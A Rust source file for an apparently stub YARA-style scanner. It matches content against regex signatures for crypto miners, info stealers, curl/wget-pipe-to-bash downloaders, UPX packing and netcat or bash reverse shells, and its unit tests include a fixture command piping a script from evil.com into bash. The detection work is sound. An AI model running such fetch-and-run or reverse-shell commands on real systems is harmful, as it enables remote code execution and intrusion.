use crate::engine::{ScanError, Scanner};
use crate::models::{Finding, FindingCategory, Confidence, ScanKind, ScanRequest, ScanTarget, Severity};
use async_trait::async_trait;
use regex::Regex;
use std::collections::HashMap;

#[derive(Clone)]
pub struct YaraRule {
    pub id: String,
    pub name: String,
    pub patterns: Vec<Regex>,
    pub severity: Severity,
}

pub struct StubYaraEngine {
    pub rules: Vec<YaraRule>,
}

impl StubYaraEngine {
    pub fn new() -> Self {
        let rules = vec![
            YaraRule {
                id: "M_CryptoMiner_Generic_2024".to_string(),
                name: "Generic Crypto Miner Pattern".to_string(),
                patterns: vec![
                    Regex::new(r"stratum\+tcp://").unwrap(),
                    Regex::new(r"xmrig").unwrap(),
                ],
                severity: Severity::Critical,
            },
            YaraRule {
                id: "M_PythonStealer_A".to_string(),
                name: "Python Information Stealer".to_string(),
                patterns: vec![Regex::new(r"urllib\.request.*urlopen.*steal").unwrap()],
                severity: Severity::High,
            },
            YaraRule {
                id: "M_BashDownloader_B".to_string(),
                name: "Bash Downloader Pattern".to_string(),
                patterns: vec![
                    Regex::new(r"bash\s+-c.*curl").unwrap(),
                    Regex::new(r"curl.*\|.*bash").unwrap(),
                    Regex::new(r"wget.*\|.*bash").unwrap(),
                ],
                severity: Severity::High,
            },
            YaraRule {
                id: "M_Packed_UPX".to_string(),
                name: "UPX Packed Executable".to_string(),
                patterns: vec![Regex::new(r"UPX!").unwrap()],
                severity: Severity::Medium,
            },
            YaraRule {
                id: "M_RevShell_Generic".to_string(),
                name: "Generic Reverse Shell Pattern".to_string(),
                patterns: vec![
                    Regex::new(r"nc\s+-[el]\s+").unwrap(),
                    Regex::new(r"/bin/bash\s+-i").unwrap(),
                ],
                severity: Severity::High,
            },
        ];
        Self { rules }
    }

    pub fn scan_payload(&self, payload: &str) -> Vec<Finding> {
        let mut findings = vec![];

        for rule in &self.rules {
            for pattern in &rule.patterns {
                if pattern.is_match(payload) {
                    let mut f = Finding::new(
                        rule.id.clone(),
                        rule.name.clone(),
                        FindingCategory::Malware,
                        rule.severity,
                        format!("Malware signature detected: {}", rule.name),
                        "This content matches a known malware signature pattern".to_string(),
                    );
                    f.confidence = Confidence::High;
                    f.remediation = Some("Isolate the affected system and perform incident response".to_string());
                    findings.push(f);
                    break;
                }
            }
        }

        findings
    }
}

impl Default for StubYaraEngine {
    fn default() -> Self {
        Self::new()
    }
}

pub struct YaraScanner {
    engine: StubYaraEngine,
}

impl YaraScanner {
    pub fn new() -> Self {
        Self {
            engine: StubYaraEngine::new(),
        }
    }
}

impl Default for YaraScanner {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait::async_trait]
impl Scanner for YaraScanner {
    fn kind(&self) -> ScanKind {
        ScanKind::Yara
    }

    async fn scan(&self, req: &ScanRequest) -> Result<Vec<Finding>, ScanError> {
        match &req.target {
            ScanTarget::Content(data) => {
                let payload = String::from_utf8_lossy(data);
                let findings = self.engine.scan_payload(&payload);
                Ok(findings)
            }
            _ => Err(ScanError::InvalidRequest("Expected Content target".to_string())),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_yara_bash_downloader_detection() {
        let scanner = YaraScanner::new();
        let content = b"#!/bin/bash\ncurl http://evil.com/malware.sh | bash";
        let req = ScanRequest {
            kind: ScanKind::Yara,
            target: ScanTarget::Content(content.to_vec()),
            options: Default::default(),
        };

        let findings = scanner.scan(&req).await.unwrap();
        assert!(findings.iter().any(|f| f.rule_id == "M_BashDownloader_B"));
    }

    #[tokio::test]
    async fn test_yara_clean_payload() {
        let scanner = YaraScanner::new();
        let content = b"This is a normal text document with no suspicious content at all.";
        let req = ScanRequest {
            kind: ScanKind::Yara,
            target: ScanTarget::Content(content.to_vec()),
            options: Default::default(),
        };

        let findings = scanner.scan(&req).await.unwrap();
        assert!(findings.is_empty());
    }

    #[test]
    fn test_stub_yara_engine_creation() {
        let engine = StubYaraEngine::new();
        assert_eq!(engine.rules.len(), 5);
        assert!(engine.rules.iter().any(|r| r.id == "M_CryptoMiner_Generic_2024"));
    }
}
